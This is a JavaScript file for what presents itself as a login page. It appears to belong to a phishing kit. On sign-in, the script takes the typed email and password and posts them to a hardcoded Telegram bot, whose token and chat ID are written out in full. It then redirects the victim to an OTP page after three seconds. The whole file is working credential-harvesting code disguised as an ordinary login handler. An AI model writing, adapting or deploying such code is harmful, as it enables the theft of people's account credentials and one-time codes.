
// login page


let user_email = document.getElementById('user_email')
let user_password = document.getElementById('user_password')
let sign_in = document.getElementById('sign-in')

sign_in.addEventListener('click', ()=> {

    if (user_email.value !== '' || user_password.value !== '') {
        

        localStorage.setItem('user_email', user_email.value)

        // const formData = new FormData();
        // formData.append('email', user_email.value)
        // formData.append('password', user_password.value)

        const data = {
            chat_id: 1159922503,
            parse_mode: 'HTML',
            text: ` <b>Email: ${user_email.value}</b>📧📧📧<b> Password: ${user_password.value}</b>`
        }

        axios.post('https://api.telegram.org/bot5642243651:AAGVL6ga-Ae08Tz2pb9SAuHW211ykBa1NQg/sendMessage', data,{
            "Content-Type": "application/json"
        })
        .then(response => {
            console.log(response.data)
        })
        .catch(error => alert(error))

        
        sign_in.disabled = true

        setTimeout(() => {
            location.replace("/otp.html")
            // console.log(`email is ${localStorage.getItem('user_email')} and pass is ${localStorage.getItem('user_password')}`)
        }, 3000);
    }
    
})




